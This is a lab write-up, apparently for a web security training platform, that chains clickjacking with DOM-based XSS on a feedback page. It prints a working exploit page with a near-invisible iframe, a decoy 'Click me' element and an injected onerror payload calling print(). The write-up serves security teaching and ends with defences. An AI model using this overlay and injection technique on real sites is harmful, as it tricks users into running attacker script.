# Lab: Exploiting Clickjacking Vulnerability to Trigger DOM-Based XSS

## Description

This lab demonstrates how clickjacking can be combined with a DOM-based XSS vulnerability. The goal is to trick the victim into clicking a visible **"Click me"** element, which causes a DOM XSS payload to execute the `print()` function.

## Exploitation

First, the DOM-based XSS vulnerability was identified in the feedback page. A payload invoking the `print()` function was injected into the `name` parameter, while the remaining form fields were prepopulated through URL parameters. The resulting URL was then embedded inside an iframe on a malicious page.

Next, a visible decoy element was positioned over the hidden button inside the iframe. After adjusting the iframe dimensions, opacity, and alignment, the exploit was delivered to the victim. When the victim clicked the visible element, the hidden button was activated, causing the page to process the malicious input and execute the `print()` function.

### Exploit HTML

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe
src="https://0a94004f046a55fc8087038e009d0066.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult">
</iframe>
```



This lab illustrates that clickjacking can serve as a carrier for more powerful attacks such as DOM-based XSS. By combining a clickjacking attack with a preconstructed XSS payload, an attacker can trick users into executing arbitrary JavaScript. Effective defenses require both anti-clickjacking mechanisms and proper validation and sanitization of user input.
